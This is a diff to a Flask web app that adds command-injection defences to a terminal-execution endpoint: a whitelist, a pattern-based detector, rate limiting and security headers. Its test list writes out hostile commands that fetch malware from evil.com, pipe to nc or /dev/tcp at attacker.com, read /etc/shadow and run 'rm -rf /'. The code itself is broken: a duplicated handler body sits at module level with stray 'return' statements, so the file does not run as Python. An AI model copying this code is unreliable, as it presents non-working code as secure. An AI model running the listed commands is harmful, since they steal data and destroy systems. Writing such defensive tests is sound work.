@@ -24,6 +24,11 @@ from typing import Optional
 from enum import Enum
 from dataclasses import dataclass
 from typing import List, Set
+import time
+import shlex
+import logging
+from collections import defaultdict, deque
+from typing import Dict, List
 
 
 load_dotenv()
@@ -497,6 +502,8 @@ def revert_backup():
         if os.path.exists(backup_path):
              import shutil
              shutil.copy2(backup_path, target_path)
+
+
  @app.route("/api/save", methods=["POST"])
 def save_file():
     data = request.get_json()
@@ -523,113 +530,218 @@ def save_file():
         return jsonify({"error": msg}), 400
 
 
-    else:
-        return jsonify({"error": msg}), 400
-
 @app.route("/api/terminal/run", methods=["POST"])
+@limiter.limit("10 per minute")  # Add rate limiting
 def terminal_run():
-    # Define allowed commands and their arguments
-    ALLOWED_COMMANDS = {
-        'npm': ['install', 'test', 'run', 'build', 'start'],
-        'python': ['-m', 'pip', 'install', '-m', 'http.server', '-m', 'pytest'],
-        'pip': ['install', 'list', 'show'],
-        'ls': ['-la', '-l', '-a'],
-        'cat': [],
-        'wc': ['-l', '-w', '-c'],
-        'mkdir': [],
-        'touch': [],
-        'rm': ['-rf', '-r', '-f'],
-        'cp': ['-r'],
-        'mv': [],
-        'git': ['status', 'add', 'commit', 'push', 'pull', 'clone', 'init']
-    }
-
-    def validate_command_parts(command_parts: List[str]) -> bool:
-        """Validate command and arguments against whitelist"""
-        if not command_parts:
-            return False
-        
-        base_command = command_parts[0]
-        
-        # Check if command is allowed
-        if base_command not in ALLOWED_COMMANDS:
-            return False
-        
-        # Check arguments if any are provided
-        if len(command_parts) > 1:
-            allowed_args = ALLOWED_COMMANDS[base_command]
-            for arg in command_parts[1:]:
-                # Skip file/directory names (they don't start with -)
-                if not arg.startswith('-'):
-                    continue
-                # Check if argument is allowed
-                if arg not in allowed_args:
-                    return False
-        
-        return True
-
-    def secure_terminal_run(command: str, project_name: str) -> Dict[str, Any]:
-        """
-        Securely execute terminal commands with injection prevention
-        """
-        # Input validation
-        if not command or not isinstance(command, str):
-            return {"output": "Error: Invalid command", "error": "Invalid input"}
-        
-        if not project_name or not isinstance(project_name, str):
-            return {"output": "Error: Invalid project name", "error": "Invalid input"}
-        
-        # Path validation
-        try:
-            project_root = get_secure_project_path(project_name)
-        except ValueError as e:
-            return {"output": f"Error: {str(e)}", "error": "Invalid project"}
-        
-        if not os.path.exists(project_root):
-            return {"output": f"Error: Project path not found: {project_root}", "error": "Project not found"}
-        
-        # Parse command safely using shlex
-        try:
-            command_parts = shlex.split(command.strip())
-        except ValueError as e:
-            return {"output": f"Error: Invalid command syntax: {str(e)}", "error": "Parse error"}
-        
-        # Validate against whitelist
-        if not validate_command_parts(command_parts):
-            return {"output": "Error: Command not allowed", "error": "Unauthorized command"}
-        
-        # Additional safety: Check for dangerous patterns
-        dangerous_patterns = ['&&', '||', ';', '|', '`', '$', '(', ')', '<', '>', '\n', '\r']
-        for part in command_parts:
-            for pattern in dangerous_patterns:
-                if pattern in part:
-                    return {"output": f"Error: Dangerous character detected: {pattern}", "error": "Security violation"}
-        
-        # Execute safely with shell=False
-        try:
-            result = subprocess.run(
-                command_parts,
-                shell=False,  # CRITICAL: Never use shell=True
-                cwd=project_root,
-                capture_output=True,
-                text=True,
-                timeout=30,
-                check=False
-            )
-            
-            output = result.stdout if result.stdout else result.stderr
-            if not output:
-                output = f"Command completed with exit code: {result.returncode}"
-                
-            return {"output": output, "exit_code": result.returncode}
-            
-        except subprocess.TimeoutExpired:
-            return {"output": "Error: Command timed out after 30 seconds", "error": "Timeout"}
-        except FileNotFoundError:
-            return {"output": f"Error: Command not found: {command_parts[0]}", "error": "Command not found"}
-        except Exception as e:
-            return {"output": f"Execution Error: {str(e)}", "error": "Execution failed"}
+    """Secure terminal command execution"""
+    data = request.get_json()
+    command = data.get("command", "")
+    project_name = data.get("project_name", "")
     
+    # Get user information for monitoring
+    user_id = session.get("github_user", "anonymous")
+    ip_address = request.remote_addr
+    
+    # Input validation
+    if not command or not isinstance(command, str):
+        return jsonify({"output": "Error: Invalid command", "error": "Invalid input"}), 400
+    
+    if not project_name or not isinstance(project_name, str):
+        return jsonify({"output": "Error: Invalid project name", "error": "Invalid input"}), 400
+    
+    # Sanitize input
+    sanitized_command = CommandSanitizer.sanitize_input(command)
+    if not sanitized_command:
+        return jsonify({"output": "Error: Invalid command syntax", "error": "Sanitization failed"}), 400
+    
+    # Path validation
+    try:
+        project_root = get_secure_project_path(project_name)
+    except ValueError as e:
+        return jsonify({"output": f"Error: {str(e)}", "error": "Invalid project"}), 400
+    
+    if not os.path.exists(project_root):
+        return jsonify({"output": f"Error: Project path not found: {project_root}", "error": "Project not found"}), 404
+    
+    # Parse command safely using shlex
+    try:
+        command_parts = shlex.split(sanitized_command.strip())
+    except ValueError as e:
+        return jsonify({"output": f"Error: Invalid command syntax: {str(e)}", "error": "Parse error"}), 400
+    
+    # Validate against whitelist
+    if not validate_command_parts(command_parts):
+        return jsonify({"output": "Error: Command not allowed", "error": "Unauthorized command"}), 403
+    
+    # Additional safety: Check for dangerous patterns
+    dangerous_patterns = ['&&', '||', ';', '|', '`', '$', '(', ')', '<', '>', '\n', '\r']
+    for part in command_parts:
+        for pattern in dangerous_patterns:
+            if pattern in part:
+                return jsonify({"output": f"Error: Dangerous character detected: {pattern}", "error": "Security violation"}), 403
+    
+    # Execute securely with shell=False
+    try:
+        result = subprocess.run(
+            command_parts,
+            shell=False,  # CRITICAL: Never use shell=True
+            cwd=project_root,
+            capture_output=True,
+            text=True,
+            timeout=30,
+            check=False
+        )
+        
+        output = result.stdout if result.stdout else result.stderr
+        if not output:
+            output = f"Command completed with exit code: {result.returncode}"
+            
+        return jsonify({"output": output, "exit_code": result.returncode})
+        
+    except subprocess.TimeoutExpired:
+        return jsonify({"output": "Error: Command timed out after 30 seconds", "error": "Timeout"}), 408
+    except FileNotFoundError:
+        return jsonify({"output": f"Error: Command not found: {command_parts[0]}", "error": "Command not found"}), 404
+    except Exception as e:
+        return jsonify({"output": f"Execution Error: {str(e)}", "error": "Execution failed"}), 500
+    
+"""Secure terminal command execution"""
+data = request.get_json()
+command = data.get("command", "")
+project_name = data.get("project_name", "")
+
+# Get user information for monitoring
+user_id = session.get("user_id", "anonymous")
+ip_address = request.remote_addr
+
+# Input validation
+if not command or not project_name:
+    return jsonify({"output": "Error: Missing command or project", "error": "Invalid input"}), 400
+
+# Sanitize input
+sanitized_command = CommandSanitizer.sanitize_input(command)
+if not sanitized_command:
+    return jsonify({"output": "Error: Invalid command syntax", "error": "Sanitization failed"}), 400
+
+# Run injection detection
+detection_result = injection_detector.analyze_command(user_id, sanitized_command, ip_address)
+if not detection_result["allowed"]:
+    logging.warning(f"Blocked command injection attempt from user {user_id} at {ip_address}: {sanitized_command}")
+    return jsonify({
+        "output": f"Error: Command blocked - {detection_result['reason']}",
+        "error": "Security violation",
+        "risk_score": detection_result["risk_score"]
+    }), 403
+
+# Execute secure command
+result = secure_terminal_run(sanitized_command, project_name)
+
+# Log successful execution
+logging.info(f"User {user_id} executed command: {sanitized_command[:50]}...")
+
+return jsonify(result)
+# Define allowed commands and their arguments
+ALLOWED_COMMANDS = {
+    'npm': ['install', 'test', 'run', 'build', 'start'],
+    'python': ['-m', 'pip', 'install', '-m', 'http.server', '-m', 'pytest'],
+    'pip': ['install', 'list', 'show'],
+    'ls': ['-la', '-l', '-a'],
+    'cat': [],
+    'wc': ['-l', '-w', '-c'],
+    'mkdir': [],
+    'touch': [],
+    'rm': ['-rf', '-r', '-f'],
+    'cp': ['-r'],
+    'mv': [],
+    'git': ['status', 'add', 'commit', 'push', 'pull', 'clone', 'init']
+}
+
+def validate_command_parts(command_parts: List[str]) -> bool:
+    """Validate command and arguments against whitelist"""
+    if not command_parts:
+        return False
+    
+    base_command = command_parts[0]
+    
+    # Check if command is allowed
+    if base_command not in ALLOWED_COMMANDS:
+        return False
+    
+    # Check arguments if any are provided
+    if len(command_parts) > 1:
+        allowed_args = ALLOWED_COMMANDS[base_command]
+        for arg in command_parts[1:]:
+            # Skip file/directory names (they don't start with -)
+            if not arg.startswith('-'):
+                continue
+            # Check if argument is allowed
+            if arg not in allowed_args:
+                return False
+    
+    return True
+
+def secure_terminal_run(command: str, project_name: str) -> Dict[str, Any]:
+    """
+    Securely execute terminal commands with injection prevention
+    """
+    # Input validation
+    if not command or not isinstance(command, str):
+        return {"output": "Error: Invalid command", "error": "Invalid input"}
+    
+    if not project_name or not isinstance(project_name, str):
+        return {"output": "Error: Invalid project name", "error": "Invalid input"}
+    
+    # Path validation
+    try:
+        project_root = get_secure_project_path(project_name)
+    except ValueError as e:
+        return {"output": f"Error: {str(e)}", "error": "Invalid project"}
+    
+    if not os.path.exists(project_root):
+        return {"output": f"Error: Project path not found: {project_root}", "error": "Project not found"}
+    
+    # Parse command safely using shlex
+    try:
+        command_parts = shlex.split(command.strip())
+    except ValueError as e:
+        return {"output": f"Error: Invalid command syntax: {str(e)}", "error": "Parse error"}
+    
+    # Validate against whitelist
+    if not validate_command_parts(command_parts):
+        return {"output": "Error: Command not allowed", "error": "Unauthorized command"}
+    
+    # Additional safety: Check for dangerous patterns
+    dangerous_patterns = ['&&', '||', ';', '|', '`', '$', '(', ')', '<', '>', '\n', '\r']
+    for part in command_parts:
+        for pattern in dangerous_patterns:
+            if pattern in part:
+                return {"output": f"Error: Dangerous character detected: {pattern}", "error": "Security violation"}
+    
+    # Execute safely with shell=False
+    try:
+        result = subprocess.run(
+            command_parts,
+            shell=False,  # CRITICAL: Never use shell=True
+            cwd=project_root,
+            capture_output=True,
+            text=True,
+            timeout=30,
+            check=False
+        )
+        
+        output = result.stdout if result.stdout else result.stderr
+        if not output:
+            output = f"Command completed with exit code: {result.returncode}"
+            
+        return {"output": output, "exit_code": result.returncode}
+        
+    except subprocess.TimeoutExpired:
+        return {"output": "Error: Command timed out after 30 seconds", "error": "Timeout"}
+    except FileNotFoundError:
+        return {"output": f"Error: Command not found: {command_parts[0]}", "error": "Command not found"}
+    except Exception as e:
+        return {"output": f"Execution Error: {str(e)}", "error": "Execution failed"}
+
 
 @app.route("/api/voices", methods=["GET"])
 def get_voices():
@@ -1261,3 +1373,118 @@ class CommandWhitelist:
                 return False
                 
         return True
+
+class CommandInjectionDetector:
+    """Real-time command injection detection"""
+    
+    def __init__(self):
+        self.suspicious_patterns = [
+            r'&&', r'\|\|', r';.*&', r'\|.*\|', r'`.*`',
+            r'\$\(.*\)', r'\${.*}', r'eval\s*\(', r'exec\s*\('
+        ]
+        self.request_history = defaultdict(lambda: deque(maxlen=100))
+        self.blocked_commands = []
+        
+    def analyze_command(self, user_id: str, command: str, ip_address: str) -> Dict[str, any]:
+        """Analyze command for injection attempts"""
+        detection_result = {
+            "allowed": True,
+            "reason": "",
+            "risk_score": 0,
+            "patterns_found": []
+        }
+        
+        # Check for suspicious patterns
+        for pattern in self.suspicious_patterns:
+            if re.search(pattern, command, re.IGNORECASE):
+                detection_result["patterns_found"].append(pattern)
+                detection_result["risk_score"] += 25
+                
+        # Rate limiting check
+        current_time = time.time()
+        user_requests = self.request_history[user_id]
+        
+        # Remove old requests (older than 1 minute)
+        while user_requests and current_time - user_requests[0] > 60:
+            user_requests.popleft()
+            
+        # Check for rapid requests (potential automated attack)
+        if len(user_requests) > 20:  # More than 20 commands in 1 minute
+            detection_result["risk_score"] += 50
+            
+        user_requests.append(current_time)
+        
+        # Check for command chaining attempts
+        if len(command.split()) > 10:  # Unusually long command
+            detection_result["risk_score"] += 15
+            
+        # Make decision based on risk score
+        if detection_result["risk_score"] >= 50:
+            detection_result["allowed"] = False
+            detection_result["reason"] = "High risk score detected"
+            self.blocked_commands.append({
+                "user_id": user_id,
+                "command": command,
+                "ip_address": ip_address,
+                "timestamp": current_time,
+                "risk_score": detection_result["risk_score"]
+            })
+            
+        return detection_result
+
+# Global detector instance
+injection_detector = CommandInjectionDetector()
+
+# Add to your security headers
+@app.after_request
+def add_security_headers(response):
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    response.headers['Content-Security-Policy'] = "default-src 'self'"
+    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+    return response
+
+# Implement proper logging
+import logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('security.log'),
+        logging.StreamHandler()
+    ]
+)
+
+security_logger = logging.getLogger('security')
+
+# Test cases for command injection
+INJECTION_TEST_CASES = [
+    "ls; cat /etc/passwd",
+    "ls && rm -rf /",
+    "ls || wget http://evil.com/malware.sh",
+    "ls `whoami`",
+    "ls $(id)",
+    "ls | nc attacker.com 4444",
+    "ls > /dev/tcp/attacker.com/4444",
+    "ls\nrm -rf /",
+    "ls\rwhoami",
+    "test.txt; ls -la",
+    "test.txt && cat /etc/shadow",
+    "test.txt||whoami",
+    "test.txt`id`",
+    "test.txt$(id)",
+    "test.txt|whoami",
+    "test.txt>output.txt",
+    "test.txt\nls",
+    "test.txt\rwhoami"
+]
+
+def test_command_injection_prevention():
+    """Test your injection prevention"""
+    sanitizer = CommandSanitizer()
+    
+    for test_case in INJECTION_TEST_CASES:
+        result = sanitizer.sanitize_input(test_case)
+        print(f"Input: {test_case!r} -> Result: {result!r}")
+        assert result is None, f"Failed to block injection: {test_case}"
